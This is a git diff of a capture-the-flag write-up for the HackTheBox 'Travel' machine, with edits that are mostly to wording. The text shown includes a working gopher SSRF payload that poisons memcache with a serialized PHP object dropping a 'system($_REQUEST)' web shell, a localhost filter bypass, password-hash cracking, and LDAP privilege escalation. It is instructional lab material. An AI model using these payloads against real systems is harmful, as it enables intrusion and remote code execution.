@@ -6,7 +6,7 @@ tags: [sourcecode, git, php, SSRF, gopher, deserilization, LDAP, docker, memcach
 image: /assets/img/Posts/Travel.png
 ---
 
-> Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We'll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied data and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We'll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell with an RCE and eventually a reverse shell inside a docker container. Subsequently we'll find password hash of a user who is an LDAP administrator, crack it with john and SSH to server and grab the user flag. For elevating privilege to root, we will manipulate attributes of a user by adding it to sudo group, adding SSH public key & password attributes to their LDAP using a GUI LDAP tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector.
+> Travel from HackTheBox is an amazing machine as it involves Source Code review and SSRF which I personally enjoy a lot. We'll start with basic enumeration where we land up with multiple VHosts, while fuzzing them we discover an exposed .git folder. This git folder provides us PHP source code of an custom RSS feed functionality being used on the blog, which accepts user supplied inputs and cache it using memcache. On further analysing we find an PHP deserialization vulnerability inside memcache, as memcache deserializes data upon retrieving it from cache. We'll perform an SSRF using gopher protocol and exploit it by poisoning the memcache with a serialized PHP payload containing an command shell which will give us RCE and eventually a reverse shell inside a docker container. Subsequently we'll find password hash of a user who is an LDAP administrator, crack it using john, SSH to server and grab the user flag. For elevating privileges to root, we will manipulate attributes of a user in an LDAP database by adding it to sudo group, adding SSH public key & password attributes to their LDAP using a GUI tool. Additionally, we will also gain root by adding the user to docker group using it as the second privilege escalation vector.
 
 ## Reconnaissance
 
@@ -59,7 +59,7 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 34.18 seconds
 ```
-Based on the scan results we can port `22,80,443` are open, nmap also gives us SAN results indicating additional hostnames used by SSL-Certificate, so lets just add them to our host file and start with Port `80 & 443` enumeration.
+Based on the scan results we can port see `22,80,443` are open, nmap also gives us SAN results indicating additional hostnames used by SSL-Certificate, so lets just add them to our host file and start with Port `80 & 443` enumeration.
 
 ```shell
 cfx:  ~/Documents/htb/travel
@@ -78,17 +78,17 @@ Looking at https://10.10.10.189 doesn't reveals anything interesting except for 
 
 #### http://www.travel.htb
 
-The webpage displayed seems to be a static webpage with non-functional links, nothing interesting.
+The webpage displayed seems to be a static webpage with non-functional links, nothing useful for us.
 
 ![website1](/assets/img/Posts/Travel/website1.png)
 
 #### http://blog.travel.htb
 
-The blog site contains several functional links and reveals its running WordPress instance at footer of the site. A welcome message hints us to check out `new RSS feature coming blog-dev team` which is our next enumeration target.
+The blog site contains several functional links and reveals its running WordPress instance at footer of the site. A welcome message hints us to check out `new RSS feature coming from blog-dev team` which is our next enumeration target.
 
 ![website2](/assets/img/Posts/Travel/website2.png)
 
-Before moving ahead to our Virtual host, I decided to run `gobuster` to discover hidden files and directories associated with this site, unfortunately it didn't return anything useful.
+Before moving ahead to our next vhost, I decided to run `gobuster` to discover hidden files and directories associated with this site, unfortunately it didn't return anything useful.
 
 ```shell
 cfx:  ~/Documents/htb/travel
@@ -169,11 +169,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2020/09/20 20:27:14 Finished
 ===============================================================
 ```
-Looking at the output from gobuster we discover an hidden `.git` repository.
+Looking at the output from gobuster we found an hidden `.git` repository.
 
 ### Dumping git repo
 
-Since we discovered a `.git` directory on blog-dev site, let use GitTools available [**here**](https://github.com/internetwache/GitTools) to dump all the git repository contents
+Since we discovered a `.git` directory on blog-dev site, let use GitTools available [**here**](https://github.com/internetwache/GitTools) to dump the git repository contents
 
 ```shell
 cfx:  ~/Documents/htb/travel/gitrepo
@@ -214,7 +214,7 @@ cfx:  ~/Documents/htb/travel/gitrepo
 [+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039
 [+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da
 ```
-
+```shell
 cfx:  ~/Documents/htb/travel/gitrepo  |master U:3 ✗|
 → git status
 On branch master
@@ -230,6 +230,7 @@ no changes added to commit (use "git add" and/or "git commit -a")
 
 Looking at the git status we discover three files were deleted from the repo, let retrieve and analyse them:
 
+```shell
 cfx:  ~/Documents/htb/travel/gitrepo  |master U:3 ✗|
 → git restore README.md rss_template.php template.php
 
@@ -246,7 +247,7 @@ drwxr-xr-x 6 root root 4096 Sep 23 00:06 .git
 
 ## Source Code Review
 
-Let's analyse the files retrieved from git repo, first lets have a look at the `README.md` to understand what this repo is about:
+Before analysing the PHP files retrieved from git repo, first lets take a look at the `README.md` to understand what the repo is about:
 
 ```shell
 cfx:  ~/Documents/htb/travel/gitrepo  |master ✓|
@@ -280,11 +281,11 @@ With reference to the `README.md` file we understand the following:
 - `template.php` and `rss_template.php` are located inside `wp-content/themes/twentytwenty`
 - `logs` directory is also located inside `wp-content/themes/twentytwenty`
 - Some `caching` mechanism has been added
-- Logging functionality to be implemented
+- `Logging` functionality is to be implemented
 
 ### Analyzing rss_template.php
 
-Lets break the code into four different parts to under it easily:
+Lets break the code into four different parts to understand it easily:
 
 1. Its including template.php, so all the Classes, Objects & functions from template.php are being used by rss_template.php
 ```php
@@ -296,7 +297,7 @@ include('template.php'); // Include all classes, object & functions from templat
 get_header();
 ?>
 ```
-2. The site is using memcache to store the URL generated contents up to 60 seconds and uses `xct_` as prefix for the generated key.
+2. The site is using memcache to store the URL generated contents in cache up to 60 seconds and uses `xct_` as prefix for the generated key.
 
 ```php
 $data = url_get_contents($url);  // Function defined in template.php
@@ -308,7 +309,7 @@ $data = url_get_contents($url);  // Function defined in template.php
          $simplepie->init();
          $simplepie->handle_content_type();
 ```
-3. In this part of the code, the URL location for RSS feeds gets defined by `get_feed` function with `url` as argument. First it will check if the url is containing `custom_feed_url` parameter where it will parse the user control custom URL for the RSS feeds, if the `custom_feed_url` parameter isn't present in the URL request it will use the feed from default location `http://www.travel.htb/newsfeed/customfeed.xml` for generating the feeds.
+3.In this part of the code, the URL location for RSS feeds gets defined by `get_feed` function taking `url` variable value. First it will check if the url is containing `custom_feed_url` parameter where it will parse the user control custom URL for the RSS feeds, if the `custom_feed_url` parameter isn't present in the URL request it will use the feed from default location `http://www.travel.htb/newsfeed/customfeed.xml` for generating the feeds.
 
 ```php
 $url = $_SERVER['QUERY_STRING'];
@@ -321,7 +322,7 @@ $url = $_SERVER['QUERY_STRING'];
       $feed = get_feed($url); // Set feed to or user-specified (custom_feed_url) or default
 ```
 
-4. In the later part of the code we see, if the `debug` parameter was supplied in the `GET request`, a `debug.php` script gets executed.
+4.In the later part of the code we see, if the `debug` parameter was supplied in the `GET request`, a `debug.php` script gets executed.
 
 ```php
 <!--
@@ -338,7 +339,7 @@ if (isset($_GET['debug'])){
 
 Let's break this code into three parts:
 
-1. The `safe($url)` function takes the url argument specified in custom_feel_url parameter, decoded the url-encoded string and checks for certain strings in the url to prevent it against LFI, Command Injection and SSRF attacks. Although SSRF filter can be bypassed by either using `0` or `LOCALHOST` instead of 127.0.0.1 to reach localhost.
+1. The `safe($url)` function takes the url value specified in custom_feel_url parameter, decodes the url-encoded string and checks for certain strings in the url to prevent it against LFI, Command Injection and SSRF attacks. Although SSRF filter can be bypassed by either using `0` or `LOCALHOST` instead of 127.0.0.1 to reach localhost.
 
 ```php
 function safe($url)
@@ -365,7 +366,7 @@ function safe($url)
 }
 ```
 
-2. Here the function `url_get_contents($url)` first calls `safe` and `escapeshellarg` on the url, and executes it with `shell_exec` for `curl` to retrive its contents and output is returned.
+2.Here the function `url_get_contents($url)` first calls `safe` and `escapeshellarg` on the url, and executes it with `shell_exec` for `curl` to retrive its contents and output is returned.
 
 ```php
 function url_get_contents ($url) {
@@ -382,7 +383,7 @@ function url_get_contents ($url) {
     return $output;
 ```
 
-3. In the last part of the code, we see a `TemplateHelper` class which isn't used anywhere inside the rss_template code, the comment on the top of file indicates it's the logging functionality which was also mentioned as ToDo in the Readme file.
+3.In the last part of the code, we see a `TemplateHelper` class which isn't used anywhere inside the rss_template code, the comments on the top of file indicates it's the logging functionality which was also mentioned as ToDo in the Readme file.
 
 ```console
 /**
@@ -416,13 +417,13 @@ class TemplateHelper
 }
 ```
 
-Now looking at the above code, It initializes a constructor with the file and it’s data on `__wakeup()` which is a PHP magic function used to re-stablish any database connections that may have been lost during serialization and deserialization tasks. Files retrieved from requests are stored in the /logs directory, for which the absolute path would be `__DIR__/logs` where __DIR__ is the directory of the wordpress’s login plugin resolving to `wp-contents/plugins/twentytwenty/logs/`
+Analysing the above code, It initializes a constructor with the `file` and it’s `data` on `__wakeup()` which is a PHP magic function used to re-stablish any database connections that may have been lost during serialization and deserialization tasks. Files retrieved from this request are stored in the `/logs` directory, for which the absolute path would be `__DIR__/logs` where __DIR__ is the directory of the wordpress’s login plugin resolving to `wp-contents/plugins/twentytwenty/logs/`
 
 ## SSRF
 
 ### Testing the Custom feed functionality
 
-On visiting <http://blog.travel.htb> we see an awesome rss link on top right, on visiting the link the webpage displays the posts from default customfeed.xml (http://www.travel.htb/newsfeed/customfeed.xml)
+On visiting <http://blog.travel.htb> we see an awesome rss link on top right, on visiting the link the webpage displays the posts from default customfeed.xml <http://www.travel.htb/newsfeed/customfeed.xml>
 
 ![rss](/assets/img/Posts/Travel/rss.png)
 
@@ -438,15 +439,15 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.189 - - [20/Sep/2020 23:42:55] "GET / HTTP/1.1" 200 -
 10.10.10.189 - - [20/Sep/2020 23:42:56] "GET /rss_template.php HTTP/1.1" 200 -
 ```
-Great ! It works and confirm SSRF, now lets check out the debug parameter functionality.
+Great ! It works, we have a potential SSRF, now lets check out the debug parameter functionality.
 
-If we pass `debug` parameter in the url, the webpage displayed is the same, but instead we can a addition of html comments in the source of the page.
+If we pass `debug` parameter in the url as <http://blog.travel.htb/awesome-rss/?debug> the webpage displayed is the same, but instead we get a addition of html comments in the source of the page.
 
 ![debug](/assets/img/Posts/Travel/debug.png)
 
-Looking at the workflow, First we visited the awesome-rss page where the feed got cached and as we supplied debug parameter in the url `debug.php` script got executed and comments were generated at the source of the page.
+Looking at the workflow, First we visited the awesome-rss page where the feed got cached and as we supplied debug parameter in the url and `debug.php` script got executed generating debug comments at the source of the page.
 
-The output shows a `PHP serialized object` along with a key name which seems to be generated using `$simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');` line we saw in rss_template.php as we can the prefix as `xct_` matches with debug output `xct_4e5612ba07(...)`
+The debug output shows a `PHP serialized object` along with a key name which seems to be generated using `$simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');` line we saw in rss_template.php as we can the prefix as `xct_` matches with debug output `xct_4e5612ba07(...)`
 
 ### Memcache Poisoning
 
@@ -454,13 +455,13 @@ Since we have already confirmed SSRF vulnerability lets proceed with the exploit
 
 Lets try to smuggle our crafted request to the backend memcache service running on the server using `custom_feed_url` parameter which will be parsed by curl.`safe()` function won't allow us to `file://` protocol but instead a better alternative would be to use `gopher://` protocol.
 
-Reasons behind `gopher` and not other protocols like `http`:
+Reasons behind using `gopher` and not other protocols like `http`:
 
 - Gopher doesn't send HTTP headers like `Host & User-Agent: curl` which would probably mess up the connection with the memcache service.
-- It will provide clean output here and will allow us to interact with memcache service by sending precise memcache commands to the server without any junk.
+- It will provide clean output and allow us to interact with memcache service by sending precise memcache commands to the server without any junk.
 - Gopher protocol is often used to construct post packets to attack intranet applications. In fact, the construction method is very simple, similar to http protocol and is one of the famous protocol used in SSRF attacks.
 
- I found a very good blog which explains why it's netter to use gopher protocol for SSRF attacks [**here**](https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html)
+ I found a very good blog which explains why it's preferred to use gopher protocol for SSRF attacks [**here**](https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html)
 
 ### Bypassing filters and testing Gopher
 
@@ -470,7 +471,7 @@ First we will send our request using gopher without any payload just to check if
 
 ![gopher](/assets/img/Posts/Travel/gopher.png)
 
-As we can see it didn't trigger any error and we were able to bypass localhost filter, now let's use `Gopherus` to generate a payload for phpmemcache and test it out but it doesn't confirm if were able to write to memcache.
+As we can see it didn't trigger any error and we were able to bypass localhost filter, now let's use `Gopherus` to generate a payload for phpmemcache and test it out.
 
 #### Gopherus
 
@@ -517,7 +518,7 @@ Now we will execute the `debug.php` script located at <http://blog.travel.htb/wp
 
 ### Memcache encoded key
 
-Now before we move ahead to `PHP deserialization attack` we need to find the full encoded key for the memcache poisoning which will be deserialized when we visit the awesome rss page with custom_feed_url parameter.
+Before we move ahead to `PHP deserialization attack` we need to find the full encoded key for the memcache poisoning which will be deserialized when we visit the awesome rss page with custom_feed_url parameter.
 While testing the custom feed functionality we saw the output of the debug script generated started with `xct_4e5612ba07(...)` when the default customfeed.xml was parsed by `get_feed` function.
 
 Based on the following lines in source code:
@@ -528,7 +529,7 @@ $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xc
 $simplepie->set_feed_url($url); //Set location of RSS feed
 $simplepie->init();
 ```
-We understand the php code sets up the cache with `prefix=xct_` which matches with `xct_4e5612ba07(...)`, but as the displayed output is truncated we still need to figure out the complete hash.
+We understand the php code sets up the cache with `prefix=xct_` which matches with `xct_4e5612ba07(...)`, but as the appending output is truncated we still need to figure out the complete hash.
 
 Let's look the source code of [**Memcache.php**](https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcache.php) which is the simplepie code for memcache.
 
@@ -563,9 +564,9 @@ As per the above code the generated url should be something like:
 
 `127.0.0.1:11211/?timeout=3600&prefix=simplepie_md5("$name:$type")`
 
-This co-relates with our source code as we have `timeout `as 60sec and prefix as `xct_`. So now we understand that the appending `4e5612ba07(...)` is an md5 hash and `name` is the Unique ID for the cache.
+This co-relates with our source code as we have `timeout`as 60sec and prefix as `xct_`. So now we understand that the appending `4e5612ba07(...)` is an md5 hash and `name` is the Unique ID for the cache.
 
-Looking at [**base.php**](https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Base.php) we found the following two lines through which we can confirm content of `type`
+Looking at [**base.php**](https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Base.php) we found the following two lines through which we can confirm the value of `type` is `spc`
 
 ```php
 const TYPE_FEED = 'spc'; //Line 60
@@ -621,11 +622,11 @@ And its calling another function `cache_name_function` which is located at Lines
  */
 public $cache_name_function = 'md5';
 ```
-As per above code `cache_name_function` does md5 of `$this->cache_name_function, $file->url)` which means it does `md5($url)` and url is feed_url as per below line from the code:
+As per above code `cache_name_function` does md5 of `$this->cache_name_function, $file->url)` which means it does `md5($url)` and url is `feed_url` as per below line from the code:
 ```php
 $url = $this->feed_url . ($this->force_feed ? '#force_feed' : ''); //Line 1376
 ```
-Combining all our analysis data we conclude:
+Combining all our analysed data we conclude:
 
 - The cache key is constructed like this: `"xct_"+ md5(md5($feed_url)+":"+"spc")`
 
@@ -657,13 +658,13 @@ We'll use the below attack scenario:
 
 - Create a PHP serialized object using the `TemplateHelper` Class with simple PHP command shell.
 - Sending the Poisoned cache request via Gopher leveraging the `custom_feed_url` parameter
-- Call the default rss feed url `http://blog.travel.htb/awesome-rss/` to trigger the cache within 60 sec.
+- Call the default rss feed url `http://blog.travel.htb/awesome-rss/` to trigger the deserilization of cache within 60 sec.
 
-### PHP Object creation
+### PHP Serialized Object
 
-For creating a PHP object, we will use TemplateHelper class, copy its contents to a new php file and add a line that creates a object, passing the filename and it's content and echo the serialized output.
+For creating a PHP serialized object, we will use `TemplateHelper class`, copy its contents to a new php file and add a line that creates the object, passing the filename and it's content and echo the serialized output.
 
-Initially when I declared $file and $data as `private` it didn't work for me but after declaring them as `public` the below exploit works for me.
+Initially when I declared `$file and $data` as `private` it didn't work for me but after declaring them as `public` the below exploit worked for me.
 
 ```php
 <?php
@@ -737,7 +738,7 @@ After everything done, you can delete memcached item by using this payload:
 gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a
 ```
 
-After replacing the default Gopherus key `SpyD3r` with our cache key `xct_4e5612ba079c530a6b1f148c0b352241` and `127.0.0.1` with `LOCALHOST` we get the following payload:
+After replacing the default Gopherus key `SpyD3r` with our cache key `xct_4e5612ba079c530a6b1f148c0b352241` and `127.0.0.1` with `LOCALHOST` we have the following payload:
 
 ```terminal
 gopher://LOCALHOST:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:7:%22cfx.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cfx%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
@@ -757,7 +758,7 @@ cfx:  ~/Documents/htb/travel
  ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
-Bingo we have serialized object cached, Now we go to `http://blog.travel.htb/awesome-rss/` which will trigger the deserialization, after deserialization we have 60 seconds to test our RCE
+Bingo ! we have our serialized object cached, Now we go to `http://blog.travel.htb/awesome-rss/` which will trigger the deserialization, after deserialization we have 60 seconds to test our RCE
 
 Here we can confirm our command shell has been written inside logs directory and we have a working RCE:
 
@@ -792,7 +793,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### Enumeration
 
-Looking at the interfaces and `.dockerenv` inside the root directory which indicates we are inside a docker container.
+Looking at the interfaces and `.dockerenv` inside the root directory indicates we are inside a docker container
 
 ```shell
 www-data@blog:/$ ip addr
@@ -832,15 +833,15 @@ drwxr-xr-x   1 root root 4096 Mar 27 00:00 usr
 drwxr-xr-x   1 root root 4096 Mar 31 18:10 var
 ```
 
-While further enumerating I found `wp` database credentials inside `/var/www/html/wp-config.php` but the hash discovered under`wp_users` didn't crack by `rockyou.txt` wordlist.
+While further enumerating I found `wp` database credentials inside `/var/www/html/wp-config.php` but the hash discovered under`wp_users` didn't crack with `rockyou.txt` wordlist.
 
 We also discover a SQL backup inside the `/opt/wordpress` directory:
-``shell
+```shell
 www-data@blog:/opt/wordpress$ ls
 ls
 backup-13-04-2020.sql
 ```
-Looking at the database backup, at the bottom we found hashes for users, pipe it to `tail` to display last 20 lines of the file:
+Looking at the database backup, at the bottom we found hashes for users, we can pipe the command with `tail` to display last 20 lines of the file:
 
 ```shell
 www-data@blog:/opt/wordpress$ cat backup-13-04-2020.sql | tail -n 20
@@ -866,11 +867,11 @@ UNLOCK TABLES;
 
 -- Dump completed on 2020-04-13 13:39:31
 ```
-From the wp_users table, we find hashes for user `admin` & `lynik-admin`, let's crack them using John.
+From the wp_users table, we found hashes for user `admin` & `lynik-admin`, let's crack them using John
 
 ### Cracking Hashes
 
-With John we were able to crack hash of user `lynik-admin` as `1stepcloser`:
+Using John we were able to crack the password hash of user `lynik-admin` as `1stepcloser`:
 
 ```shell
 cfx:  ~/Documents/htb/travel
@@ -1122,7 +1123,7 @@ result: 0 Success
 
 ### Ldapsearch Output:
 
-- Our user `lynik-admin` is the `LDAP administrator`, although the password hash is not that useful since we already know the password.
+- From ldapsearch output we discovered our user `lynik-admin` is the `LDAP administrator`, although the password hash is not that useful since we already know the password.
 ```shell
 # lynik-admin, travel.htb
 dn: cn=lynik-admin,dc=travel,dc=htb
@@ -1132,7 +1133,7 @@ objectClass: organizationalRole
 cn: lynik-admin
 userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ==
 ```
-- We also got multiple usernames residing on the box and their attributes like `uidNumber` and `gidNumber` which we can manipulate and get our self root access.
+- We also got multiple usernames residing on the box and their attributes like `uidNumber` and `gidNumber` which we can manipulate further to get our self root access.
 
 
 While looking at the groups which are presents on the box, I found the below one are most interesting which we could potentially use for escalating privileges:
@@ -1152,9 +1153,9 @@ docker:x:117:
 ```
 ### Modifying User attributes via LDAP
 
-Since we are the LDAP administrator we can modify the user attributes in LDAP. We can do this manually by adding attributes value in an LDIF file and modify them using the `ldapmodify` or we can use `Apache Directory studio` tool available [**here**](https://directory.apache.org/studio/download/download-linux.html) which has a GUI interface minimizing manual efforts of creating ldif file.
+Since we are the LDAP administrator we can modify the user attributes in LDAP. We can do this manually by adding attributes value in an LDIF file and modify them using the `ldapmodify` or we can use `Apache Directory studio` tool available [**here**](https://directory.apache.org/studio/download/download-linux.html) which has a GUI interface minimizing the manual efforts of creating ldif file.
 
-First let's use `Apache Directory Studio` and later let's also try `ldapmodify` with `ldif` files:
+First let's use `Apache Directory Studio` and later let's also try `ldapmodify` with `ldif` file:
 
 ### SSH Port forwarding
 
@@ -1199,7 +1200,7 @@ result: 0 Success
 # numResponses: 22
 # numEntries: 21
 ```
-Great ! It working flawlessly as we can see the same output from ldapsearch running on our machine, here we have specified the host as `localhost:389` (our forwarded port) along with `-b` and `-D` flag for BASE and BINDDN config we saw on .ldaprc file.
+Great ! It working flawlessly as we can see the same output from ldapsearch running on our machine, here we have specified the host as `localhost:389` (our forwarded port) along with `-b` and `-D` flag for BASE and BINDDN config we saw in .ldaprc file.
 
 Now that everything is configured let's fire up `Apache Directory Studio`
 
@@ -1213,7 +1214,7 @@ Initial configuration for setting up an LDAP connection:
 
 ![ldap2](/assets/img/Posts/Travel/ldap2.png)
 
-Now, that we have setuped our LDAP connection, lets modify the attributes of user `lynik`:
+Now that we have our LDAP connection, lets modify the attributes of user `lynik`:
 
 First, lets setup a password as `coldfusionx` by adding a new attribute `userPassword`:
 
@@ -1225,7 +1226,7 @@ Next we add an SSH public key to the user, to do that first we create a new `obj
 
 ![user3](/assets/img/Posts/Travel/user3.png)
 
-Now Let's create a SSH key for user `lynik` add the `sshPublicKey` attribute and put our SSH key there:
+Let's create a SSH key for user `lynik` add the `sshPublicKey` attribute and put our SSH key there:
 
 ```shell
 cfx:  ~/Documents/htb/travel
